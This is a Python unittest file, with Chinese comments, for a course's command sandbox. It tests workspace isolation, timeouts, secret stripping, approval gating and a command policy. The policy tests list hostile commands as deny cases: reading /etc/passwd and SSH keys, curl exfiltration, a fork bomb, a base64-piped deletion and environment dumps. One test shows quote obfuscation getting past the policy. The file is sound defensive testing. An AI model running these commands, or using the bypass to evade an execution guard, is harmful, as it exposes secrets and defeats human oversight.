"""隔离执行层（course/sandbox.py）的测试：真实启动子进程，不模拟命令结果。

证明：一次性工作目录与前后哈希、diff；超时会结束整棵进程树；输出只留首尾并标注截断；
子进程拿不到父进程环境里的密钥；命令策略拒绝明显越界的命令；需要审批而没有审批通道时不执行；
容器后端不可用时检测结果如实说明原因。

平台说明：本文件在 Linux 上实测。标注 skipUnless(IS_WINDOWS) 的用例覆盖 Windows 专属分支
（PowerShell、作业对象），未在 Windows 上实测；容器真实运行的用例只在 docker/podman 可用且
已有镜像时执行。
"""
import json
import os
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

from course import sandbox
from course.sandbox import (
    APPROVAL_EVERY_COMMAND,
    APPROVAL_NONE,
    ApprovalOutcome,
    BackendUnavailable,
    CommandPolicy,
    CommandResult,
    ContainerRunner,
    OutputLimits,
    RestrictedRunner,
    SandboxError,
    Workspace,
    child_environment,
    default_approval_mode,
    run_guarded,
    select_runner,
)

IS_WINDOWS = os.name == "nt"
PY = f'"{sys.executable}"' if IS_WINDOWS else "python"
# 固定的“主机根目录”条目，让绝对路径判断不依赖运行测试的机器。
ROOT_ENTRIES = ["bin", "etc", "usr", "home", "tmp", "proc", "dev", "var", "root", "users", "windows"]


def make_fixture(directory: Path):
    """带一个失败测试的小仓库：add 写成了减法。"""
    (directory / "tests").mkdir()
    (directory / "calc.py").write_text("def add(a, b):\n    return a - b\n", encoding="utf-8")
    (directory / "tests" / "test_calc.py").write_text(
        "import unittest\nfrom calc import add\n\n\nclass CalcTest(unittest.TestCase):\n"
        "    def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n", encoding="utf-8")
    (directory / "README.md").write_text("fixture\n", encoding="utf-8")


def process_gone(pid: int, wait: float = 3.0) -> bool:
    """进程不存在或已是僵尸（容器里 PID 1 可能不回收僵尸）都算已结束。"""
    deadline = time.time() + wait
    while time.time() < deadline:
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            return True
        status = Path(f"/proc/{pid}/status")
        try:
            if "State:\tZ" in status.read_text():
                return True
        except OSError:
            return True
        time.sleep(0.05)
    return False


class SandboxTestCase(unittest.TestCase):
    def setUp(self):
        self.source = Path(tempfile.mkdtemp(prefix="als-fixture-"))
        self.addCleanup(shutil.rmtree, self.source, True)
        make_fixture(self.source)
        self.workspace = Workspace(self.source)
        self.addCleanup(self.workspace.cleanup)


class WorkspaceTests(SandboxTestCase):
    def test_copy_is_separate_and_baseline_hashes_every_file(self):
        root = self.workspace.root
        self.assertNotEqual(root.resolve(), self.source.resolve())
        self.assertEqual(sorted(self.workspace.baseline.hashes), ["README.md", "calc.py", "tests/test_calc.py"])
        self.assertEqual(self.workspace.baseline.hashes["calc.py"], sandbox.sha256_file(self.source / "calc.py"))
        # 改副本不影响夹具源目录
        (root / "calc.py").write_text("changed\n", encoding="utf-8")
        self.assertIn("a - b", (self.source / "calc.py").read_text(encoding="utf-8"))

    def test_changes_and_unified_diff(self):
        root = self.workspace.root
        (root / "calc.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
        (root / "notes.txt").write_text("new\n", encoding="utf-8")
        (root / "README.md").unlink()
        (root / "__pycache__").mkdir()
        (root / "__pycache__" / "calc.cpython-312.pyc").write_bytes(b"\x00junk")
        changes = {change.path: change for change in self.workspace.changes()}
        self.assertEqual({path: change.status for path, change in changes.items()},
                         {"calc.py": "modified", "notes.txt": "added", "README.md": "removed"})
        self.assertEqual(changes["calc.py"].after_sha256, sandbox.sha256_file(root / "calc.py"))
        self.assertIsNone(changes["notes.txt"].before_sha256)
        diff = self.workspace.diff()
        self.assertIn("--- a/calc.py\n+++ b/calc.py", diff)
        self.assertIn("-    return a - b\n+    return a + b", diff)
        self.assertIn("+++ b/notes.txt", diff)
        self.assertIn("--- a/README.md\n+++ /dev/null", diff)
        self.assertNotIn("__pycache__", diff)

    def test_diff_is_truncated_with_marker(self):
        (self.workspace.root / "big.txt").write_text("line\n" * 5000, encoding="utf-8")
        diff = self.workspace.diff(max_chars=400)
        self.assertIn("chars omitted", diff)
        self.assertLess(len(diff), 500)

    def test_protected_changes_catch_edited_tests(self):
        (self.workspace.root / "tests" / "test_calc.py").write_text("# gutted\n", encoding="utf-8")
        self.assertEqual([c.path for c in self.workspace.protected_changes(["tests/*"])], ["tests/test_calc.py"])

    def test_resolve_keeps_paths_inside(self):
        self.assertEqual(self.workspace.resolve("calc.py"), (self.workspace.root / "calc.py").resolve())
        for bad in ("../outside.txt", "tests/../../x", "/etc/passwd", "~/x", "", "a\x00b"):
            with self.subTest(path=bad), self.assertRaises(ValueError):
                self.workspace.resolve(bad)

    @unittest.skipIf(IS_WINDOWS, "创建符号链接在 Windows 上需要额外权限")
    def test_resolve_follows_symlinks_before_checking(self):
        os.symlink(self.source.parent, self.workspace.root / "escape")
        with self.assertRaises(ValueError):
            self.workspace.resolve("escape/anything")
        # 快照把链接当作链接记录，不走进去
        self.assertTrue(self.workspace.snapshot().hashes["escape"].startswith("symlink:"))

    @unittest.skipIf(IS_WINDOWS, "创建符号链接在 Windows 上需要额外权限")
    def test_fixture_with_symlink_is_rejected(self):
        os.symlink("/etc", self.source / "link")
        with self.assertRaises(SandboxError):
            Workspace(self.source)

    def test_cleanup_removes_copy(self):
        base = self.workspace.base
        self.assertTrue(base.exists())
        self.workspace.cleanup()
        self.assertFalse(base.exists())
        self.assertTrue(self.workspace.closed)
        self.workspace.cleanup()  # 幂等

    def test_redact_hides_local_paths(self):
        text = f"rootdir: {self.workspace.root}/tests and {self.workspace.tmp}/x via {sys.executable}"
        redacted = self.workspace.redact(text)
        self.assertNotIn(str(self.workspace.base), redacted)
        self.assertNotIn(str(Path(sys.executable).parent), redacted)
        self.assertIn("<workspace>/tests", redacted)
        self.assertIn("<tmp>/x", redacted)


@unittest.skipIf(IS_WINDOWS, "以下命令用 POSIX shell 语法；Windows 分支见 WindowsTests")
class RestrictedRunnerTests(SandboxTestCase):
    def runner(self, **options):
        return RestrictedRunner(self.workspace, **options)

    def test_runs_in_workspace_and_reports_structured_result(self):
        result = self.runner().run("pwd; python -m unittest discover -s tests")
        self.assertFalse(result.ok)
        self.assertEqual(result.exit_code, 1)
        self.assertEqual(result.error_type, "nonzero_exit")
        self.assertEqual(result.backend, "restricted")
        self.assertTrue(result.stdout.startswith("<workspace>"))
        self.assertIn("FAILED", result.stderr)
        self.assertFalse(result.timed_out)
        self.assertGreaterEqual(result.duration_ms, 0)
        data = result.to_dict()
        for key in ("ok", "exit_code", "stdout", "stderr", "truncated", "timed_out", "duration_ms", "backend"):
            self.assertIn(key, data)
        json.dumps(data)

    def test_fix_then_tests_pass_and_diff_shows_it(self):
        runner = self.runner()
        fixed = runner.run("sed -i.bak 's/a - b/a + b/' calc.py && rm calc.py.bak && "
                           "python -m unittest discover -s tests")
        self.assertTrue(fixed.ok, fixed.stderr)
        self.assertEqual([c.path for c in self.workspace.changes()], ["calc.py"])
        # 没有 __pycache__ 出现在证据里：PYTHONDONTWRITEBYTECODE 生效
        self.assertFalse((self.workspace.root / "__pycache__").exists())

    def test_timeout_kills_process(self):
        started = time.perf_counter()
        result = self.runner().run("sleep 30", timeout=1)
        self.assertLess(time.perf_counter() - started, 6)
        self.assertTrue(result.timed_out)
        self.assertFalse(result.ok)
        self.assertEqual(result.error_type, "timeout")
        self.assertEqual(result.detail, {"timeout_s": 1})

    def test_timeout_kills_whole_process_tree(self):
        command = ("python -c \"import subprocess, sys; "
                   "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)']); "
                   "open('child.pid', 'w').write(str(p.pid)); p.wait()\"")
        result = self.runner().run(command, timeout=2)
        self.assertTrue(result.timed_out)
        pid = int((self.workspace.root / "child.pid").read_text())
        self.assertTrue(process_gone(pid), "孙进程在超时后仍在运行")

    def test_background_children_do_not_outlive_command(self):
        started = time.perf_counter()
        result = self.runner().run("sleep 60 & echo $! > bg.pid; echo started", timeout=10)
        self.assertTrue(result.ok)
        # 后台进程握着输出管道；不清理的话这里要等满 10 秒超时
        self.assertLess(time.perf_counter() - started, 5)
        self.assertFalse(result.escaped_processes_suspected)
        self.assertTrue(process_gone(int((self.workspace.root / "bg.pid").read_text())))

    def test_output_keeps_head_and_tail_and_marks_truncation(self):
        limits = OutputLimits(head_bytes=100, tail_bytes=50)
        command = "python -c \"print('HEAD' + 'x' * 100000 + 'TAIL')\"; echo err-line >&2"
        result = self.runner(output=limits).run(command)
        self.assertTrue(result.truncated)
        self.assertTrue(result.stdout.startswith("HEAD"))
        self.assertTrue(result.stdout.rstrip().endswith("TAIL"))
        self.assertIn("bytes omitted", result.stdout)
        self.assertEqual(result.stdout_bytes, 100009)
        self.assertLess(len(result.stdout), 250)
        self.assertEqual(result.stderr, "err-line\n")

    def test_runaway_output_is_killed_at_hard_cap(self):
        limits = OutputLimits(head_bytes=100, tail_bytes=100, hard_cap_bytes=200_000)
        started = time.perf_counter()
        result = self.runner(output=limits).run("yes", timeout=20)
        self.assertLess(time.perf_counter() - started, 10)
        self.assertTrue(result.output_limit_exceeded)
        self.assertEqual(result.error_type, "output_limit")
        self.assertFalse(result.timed_out)

    def test_child_cannot_see_parent_secrets(self):
        secret = "sk-fake-secret-for-sandbox-test"
        command = "python -c \"import os, json; print(json.dumps(dict(os.environ)))\""
        with mock.patch.dict(os.environ, {"DASHSCOPE_API_KEY": secret, "OPENAI_API_KEY": secret,
                                          "AWS_SECRET_ACCESS_KEY": secret}):
            result = self.runner().run(command)
        self.assertTrue(result.ok, result.stderr)
        child_env = json.loads(result.stdout)
        self.assertNotIn("DASHSCOPE_API_KEY", child_env)
        self.assertNotIn(secret, result.stdout)
        self.assertEqual(child_env["HOME"], "<home>")
        self.assertEqual(child_env["HTTPS_PROXY"], sandbox.DEAD_PROXY)

    def test_extra_environment_refuses_secret_names(self):
        with self.assertRaises(ValueError):
            child_environment(self.workspace, {"MY_API_TOKEN": "x"})
        env = child_environment(self.workspace, {"LESSON_MODE": "demo"})
        self.assertEqual(env["LESSON_MODE"], "demo")

    def test_stdin_is_closed(self):
        result = self.runner().run("cat", timeout=5)
        self.assertTrue(result.ok)
        self.assertFalse(result.timed_out)

    def test_should_stop_cancels_running_command(self):
        started = time.perf_counter()
        result = self.runner().run("sleep 30", timeout=20,
                                   should_stop=lambda: time.perf_counter() - started > 0.3)
        self.assertTrue(result.cancelled)
        self.assertEqual(result.error_type, "cancelled")
        self.assertLess(time.perf_counter() - started, 5)

    @unittest.skipUnless(sys.platform.startswith("linux"), "线程数与地址空间限制只在 Linux 上设置")
    def test_linux_resource_limits_are_applied(self):
        result = self.runner().run("cat /proc/self/limits")
        self.assertEqual(result.limits_applied, ["RLIMIT_NPROC", "RLIMIT_AS", "RLIMIT_FSIZE"])
        self.assertRegex(result.stdout, r"Max address space\s+2147483648")
        self.assertRegex(result.stdout, r"Max file size\s+67108864")

    def test_invalid_arguments(self):
        runner = self.runner()
        for bad in (0, -1, 10_000, True):
            with self.subTest(timeout=bad), self.assertRaises(ValueError):
                runner.run("echo hi", timeout=bad)
        with self.assertRaises(ValueError):
            runner.run("   ")
        self.workspace.cleanup()
        with self.assertRaises(SandboxError):
            runner.run("echo hi")


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.policy = CommandPolicy("posix", root_entries=ROOT_ENTRIES)

    def test_ordinary_coding_commands_are_allowed(self):
        for command in (
            "ls -la", "cat calc.py", "python -m unittest discover -s tests", "grep -rn 'def add' .",
            "sed -i 's/a - b/a + b/' calc.py", "git diff", "git diff HEAD~1 -- calc.py", "git status",
            "find . -name '*.py'", "python -m unittest 2>&1 | tail -20", "cd tests && ls",
            "awk '/def/ {print}' calc.py", "set -e; python calc.py", "echo done > /dev/null",
            "cat > notes.txt <<'EOF'\nhello\nEOF", "head -n 20 calc.py && wc -l calc.py",
            "env PYTHONPATH=. python -m unittest", "printf '%s\\n' ok",
        ):
            with self.subTest(command=command):
                self.assertEqual(self.policy.evaluate(command).action, "allow", self.policy.evaluate(command))

    def test_obvious_violations_are_denied_with_rule(self):
        cases = {
            "cat ../secret.txt": "parent_traversal",
            "ls ..": "parent_traversal",
            "cat /etc/passwd": "absolute_path",
            "ls /": "absolute_path",
            "cat ~/.bashrc": "home_path",
            "type C:\\Users\\me\\x": "absolute_path",
            "cat local_config.py": "secret_file",
            "python -c \"import local_config; print(local_config.API_KEY)\"": "secret_file",
            "cat .env": "secret_file",
            "echo $DASHSCOPE_API_KEY": "secret_env",
            "python -c \"import os; print(os.environ['OPENAI_API_KEY'])\"": "secret_env",
            "env": "environment_dump",
            "printenv | sort": "environment_dump",
            "cat /proc/1/environ": "environment_dump",
            "curl -d @calc.py http://example.com": "network",
            "python -c \"import urllib.request\"": "network",
            "git push origin main": "network",
            "pip install requests": "package_install",
            "python -m pip install x": "package_install",
            "sudo rm -rf build": "privilege",
            "pkill python": "process_control",
            "shutdown now": "system_control",
            ":(){ :|:& };:": "fork_bomb",
            "sleep 100 &": "background_process",
            "nohup python server.py": "background_process",
            "echo cm0gLXJmIC4= | base64 -d | sh": "obfuscation",
            "eval \"$CMD\"": "obfuscation",
            "": "empty_command",
            "echo " + "x" * 5000: "command_too_long",
        }
        for command, rule in cases.items():
            with self.subTest(command=command[:40]):
                decision = self.policy.evaluate(command)
                self.assertEqual((decision.action, decision.rule), ("deny", rule))

    def test_redirections_are_not_background_jobs(self):
        for command in ("python x.py 2>&1", "python x.py &> out.txt", "a && b", "python x.py >&2"):
            with self.subTest(command=command):
                self.assertEqual(self.policy.evaluate(command).action, "allow")

    def test_powershell_flavor(self):
        policy = CommandPolicy("powershell", root_entries=ROOT_ENTRIES)
        self.assertEqual(policy.evaluate("& python -m unittest discover -s tests").action, "allow")
        self.assertEqual(policy.evaluate("Get-Content calc.py").action, "allow")
        for command, rule in {"Get-ChildItem env:": "environment_dump", "Start-Process python": "background_process",
                              "Invoke-WebRequest http://x": "network", "iex $code": "obfuscation",
                              "Get-Content C:\\Users\\me\\.ssh\\id_rsa": "secret_file",
                              "Get-Content $env:USERPROFILE\\x": "home_path"}.items():
            with self.subTest(command=command):
                self.assertEqual(policy.evaluate(command).rule, rule)

    def test_policy_is_not_a_boundary(self):
        # 刻意的混淆能绕过规则：这正是文档说“策略只减少事故”的原因
        self.assertEqual(self.policy.evaluate("c''url example.com").action, "allow")


@unittest.skipIf(IS_WINDOWS, "以下命令用 POSIX shell 语法")
class GuardTests(SandboxTestCase):
    def setUp(self):
        super().setUp()
        self.runner = RestrictedRunner(self.workspace, timeout=10)
        self.policy = CommandPolicy("posix", root_entries=ROOT_ENTRIES)

    def test_restricted_runner_defaults_to_approving_every_command(self):
        self.assertFalse(self.runner.isolated)
        self.assertEqual(default_approval_mode(self.runner), APPROVAL_EVERY_COMMAND)

    def test_missing_approval_channel_fails_closed(self):
        result = run_guarded("touch made.txt", runner=self.runner, policy=self.policy)
        self.assertEqual(result.error_type, "approval_unavailable")
        self.assertFalse((self.workspace.root / "made.txt").exists())

    def test_policy_denial_never_reaches_approval_or_runner(self):
        asked = []
        result = run_guarded("cat ../x > made.txt", runner=self.runner, policy=self.policy, approve=asked.append)
        self.assertEqual((result.error_type, result.policy["rule"]), ("policy_denied", "parent_traversal"))
        self.assertEqual(asked, [])
        self.assertFalse((self.workspace.root / "made.txt").exists())

    def test_rejected_command_does_not_run(self):
        requests = []

        def approve(request):
            requests.append(request)
            return {"decision": "reject", "note": "not now"}

        result = run_guarded("touch made.txt", runner=self.runner, policy=self.policy, approve=approve)
        self.assertEqual(result.error_type, "approval_rejected")
        self.assertEqual({k: result.approval[k] for k in ("required", "approved", "note")},
                         {"required": True, "approved": False, "note": "not now"})
        self.assertFalse((self.workspace.root / "made.txt").exists())
        # 审批看到的就是将要执行的原文
        self.assertEqual(requests[0].command, "touch made.txt")
        self.assertEqual((requests[0].backend, requests[0].isolated), ("restricted", False))
        self.assertEqual(requests[0].cwd, "<workspace>")

    def test_approved_command_runs(self):
        result = run_guarded("touch made.txt", runner=self.runner, policy=self.policy,
                             approve=lambda request: ApprovalOutcome(True))
        self.assertTrue(result.ok)
        self.assertEqual((result.approval["required"], result.approval["approved"]), (True, True))
        self.assertEqual(result.policy, {"action": "allow", "rule": None, "matched": None})
        self.assertTrue((self.workspace.root / "made.txt").exists())

    def test_bad_approver_answer_raises(self):
        with self.assertRaises(TypeError):
            run_guarded("ls", runner=self.runner, policy=self.policy, approve=lambda request: "yes")
        with self.assertRaises(ValueError):
            run_guarded("ls", runner=self.runner, policy=self.policy, approve=lambda request: {"decision": "ok"})

    def test_cancellation_before_execution_propagates(self):
        class Stopped(RuntimeError):
            pass

        calls = []

        def check():
            calls.append(1)
            if len(calls) == 2:  # 审批之后、执行之前停止
                raise Stopped()

        with self.assertRaises(Stopped):
            run_guarded("touch made.txt", runner=self.runner, policy=self.policy, approve=lambda r: True,
                        check_cancelled=check)
        self.assertFalse((self.workspace.root / "made.txt").exists())

    def test_explicit_no_approval_mode(self):
        result = run_guarded("echo hi", runner=self.runner, policy=self.policy, approval_mode=APPROVAL_NONE)
        self.assertTrue(result.ok)
        self.assertEqual(result.approval, {"required": False})

    def context(self, decide):
        """真实的 RunContext：审批走离线夹具通道（approval_policy），事件收集到列表里。"""
        from course.execution import RunContext
        events = []
        context = RunContext(lesson_id="sandbox-test", exercise_id="fix", question="q", mode="offline",
                             model="m", representation="sdk_standardized", inputs={}, api_key="",
                             completion=None, emit_event=lambda kind, data, number: events.append((kind, data)),
                             approval_policy=decide)
        return context, events

    def approver(self, context, **options):
        return sandbox.context_approver(context, lambda request: f"Run: {request.command}", **options)

    def test_platform_approval_records_exact_command_before_running(self):
        context, events = self.context(lambda request: {"decision": "approve"})
        result = run_guarded("touch made.txt", runner=self.runner, policy=self.policy,
                             approve=self.approver(context), check_cancelled=context.check_cancelled)
        self.assertTrue(result.ok)
        kinds = [kind for kind, _ in events]
        self.assertEqual(kinds, ["approval_requested", "approval_resolved"])
        payload = events[0][1]["payload"]
        self.assertEqual((payload["command"], payload["isolated"], payload["backend"]),
                         ("touch made.txt", False, "restricted"))
        self.assertEqual(events[0][1]["risk"], "high")
        self.assertEqual(result.approval["decided_by"], "offline_fixture")
        self.assertEqual(result.approval["approval_id"], events[0][1]["approval_id"])

    def test_platform_rejection_and_timeout_do_not_run(self):
        for answer, error_type in (({"decision": "reject", "note": "no"}, "approval_rejected"),
                                   ({"decision": "timeout"}, "approval_timeout")):
            with self.subTest(answer=answer):
                context, _ = self.context(lambda request, answer=answer: answer)
                result = run_guarded("touch made.txt", runner=self.runner, policy=self.policy,
                                     approve=self.approver(context))
                self.assertEqual(result.error_type, error_type)
                self.assertFalse((self.workspace.root / "made.txt").exists())

    def test_edited_command_runs_only_after_its_own_policy_check(self):
        def edit_to(command):
            return lambda request: {"decision": "approve",
                                    "edited_payload": {**request["payload"], "command": command}}

        context, _ = self.context(edit_to("touch edited.txt"))
        result = run_guarded("touch made.txt", runner=self.runner, policy=self.policy,
                             approve=self.approver(context, editable=True))
        self.assertTrue(result.ok)
        self.assertEqual((result.command, result.approval["edited"]), ("touch edited.txt", True))
        self.assertTrue((self.workspace.root / "edited.txt").exists())
        self.assertFalse((self.workspace.root / "made.txt").exists())
        context, _ = self.context(edit_to("cat ../x"))
        denied = run_guarded("ls", runner=self.runner, policy=self.policy,
                             approve=self.approver(context, editable=True))
        self.assertEqual((denied.error_type, denied.policy["rule"]), ("policy_denied", "parent_traversal"))

    def test_localized_error_text(self):
        result = run_guarded("cat ../x", runner=self.runner, policy=self.policy)
        data = result.to_dict(messages={"policy_denied:parent_traversal": "Path leaves the workspace: {matched}"})
        self.assertEqual(data["error"], "Path leaves the workspace: ..")
        self.assertEqual(data["error_type"], "policy_denied")
        refused = CommandResult.refused("x", "restricted", "approval_rejected", "dev text", note="n")
        self.assertEqual(refused.to_dict({"approval_rejected": "Rejected ({note})"})["error"], "Rejected (n)")


class ContainerDetectionTests(SandboxTestCase):
    def test_real_detection_is_well_formed(self):
        status = ContainerRunner.detect()
        self.assertIn(status.reason, {"ok", "engine_not_found", "engine_unreachable", "image_missing", "probe_failed"})
        self.assertEqual(status.available, status.reason == "ok")
        json.dumps(status.to_dict())
        if shutil.which("docker") is None and shutil.which("podman") is None:
            self.assertEqual(status.reason, "engine_not_found")

    def test_no_engine_on_path(self):
        with mock.patch.object(sandbox.shutil, "which", return_value=None):
            status = ContainerRunner.detect()
        self.assertEqual((status.available, status.reason), (False, "engine_not_found"))
        self.assertEqual(status.checked, ("docker:engine_not_found", "podman:engine_not_found"))

    def probe(self, *answers):
        replies = iter(answers)

        def fake_run(argv, **kwargs):
            code, out, err = next(replies)
            return mock.Mock(returncode=code, stdout=out, stderr=err)

        which = mock.patch.object(sandbox.shutil, "which", side_effect=lambda name: f"/fake/{name}"
                                  if name == "docker" else None)
        run = mock.patch.object(sandbox.subprocess, "run", side_effect=fake_run)
        with which, run:
            return ContainerRunner.detect(image="img:1")

    def test_engine_unreachable(self):
        status = self.probe((1, "", "Cannot connect to the Docker daemon\nmore"))
        self.assertEqual((status.available, status.reason, status.backend), (False, "engine_unreachable", "container:docker"))
        self.assertEqual(status.message, "Cannot connect to the Docker daemon")

    def test_image_missing(self):
        status = self.probe((0, "27.0.1\n", ""), (1, "", "No such image"))
        self.assertEqual((status.reason, status.version), ("image_missing", "27.0.1"))
        self.assertIn("docker pull img:1", status.message)

    def test_available(self):
        status = self.probe((0, "27.0.1\n", ""), (0, "[]", ""))
        self.assertTrue(status.available)
        self.assertEqual(status.engine, "/fake/docker")

    def test_select_runner_falls_back_to_restricted(self):
        unavailable = sandbox.BackendStatus("container", False, "engine_not_found")
        with mock.patch.object(ContainerRunner, "detect", return_value=unavailable):
            runner, status = select_runner(self.workspace)
            self.assertIsInstance(runner, RestrictedRunner)
            self.assertEqual(status.reason, "engine_not_found")
            with self.assertRaises(BackendUnavailable):
                select_runner(self.workspace, prefer="container")
            with self.assertRaises(BackendUnavailable):
                ContainerRunner(self.workspace)
        runner, status = select_runner(self.workspace, prefer="restricted")
        self.assertIsInstance(runner, RestrictedRunner)

    def test_container_command_line_has_isolation_flags(self):
        runner = ContainerRunner(self.workspace, engine="docker", image="img:1")
        self.assertTrue(runner.isolated)
        self.assertEqual(default_approval_mode(runner), APPROVAL_NONE)
        argv = runner.build_argv("python -m unittest", "als-test")
        joined = " ".join(argv)
        for flag in ("--rm", "--network none", "--cap-drop ALL", "--security-opt no-new-privileges",
                     "--read-only", "--pids-limit 128", "--memory 1g", "--workdir /workspace"):
            self.assertIn(flag, joined)
        self.assertIn(f"type=bind,source={self.workspace.root},target=/workspace", argv)
        self.assertEqual(argv[-4:], ["img:1", "sh", "-c", "python -m unittest"])
        # 宿主环境变量一个也不传进容器
        passed = [argv[i + 1] for i, item in enumerate(argv) if item == "--env"]
        self.assertTrue(all(not sandbox.SECRET_NAME.search(item.split("=")[0]) for item in passed))

    @unittest.skipUnless(ContainerRunner.detect().available, "没有可用的 docker/podman 与镜像")
    def test_real_container_run_has_no_network(self):
        runner = ContainerRunner(self.workspace, timeout=60)
        result = runner.run("python -m unittest discover -s tests")
        self.assertEqual(result.exit_code, 1)
        net = runner.run("python -c \"import socket; socket.create_connection(('1.1.1.1', 53), 3)\"")
        self.assertFalse(net.ok)


@unittest.skipUnless(IS_WINDOWS, "Windows 专属分支；未在 Windows 上实测")
class WindowsTests(SandboxTestCase):
    def test_shell_is_git_bash_or_powershell_never_wsl(self):
        shell = sandbox.detect_shell()
        if shell.flavor == "posix":
            self.assertEqual(shell.name, "git-bash")
            self.assertIn(os.path.join("Git", "bin", "bash.exe"), shell.argv[0])
        self.assertNotIn("system32\\bash.exe", shell.argv[0].lower())
        self.assertEqual(sandbox.detect_shell(prefer="powershell").flavor, "powershell")

    def test_timeout_kills_job_tree(self):
        runner = RestrictedRunner(self.workspace)
        command = (f"{PY} -c \"import subprocess, sys; "
                   "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)']); "
                   "open('child.pid', 'w').write(str(p.pid)); p.wait()\"")
        result = runner.run(command, timeout=3)
        self.assertTrue(result.timed_out)
        self.assertIn("KILL_ON_JOB_CLOSE", result.limits_applied)
        pid = (self.workspace.root / "child.pid").read_text().strip()
        listing = sandbox.subprocess.run(["tasklist", "/FI", f"PID eq {pid}"], capture_output=True, text=True)
        self.assertNotIn(pid, listing.stdout)

    def test_child_cannot_see_parent_secrets(self):
        runner = RestrictedRunner(self.workspace)
        with mock.patch.dict(os.environ, {"DASHSCOPE_API_KEY": "sk-fake-win"}):
            result = runner.run(f"{PY} -c \"import os; print(sorted(os.environ))\"")
        self.assertTrue(result.ok, result.stderr)
        self.assertNotIn("DASHSCOPE_API_KEY", result.stdout)


if __name__ == "__main__":
    unittest.main()
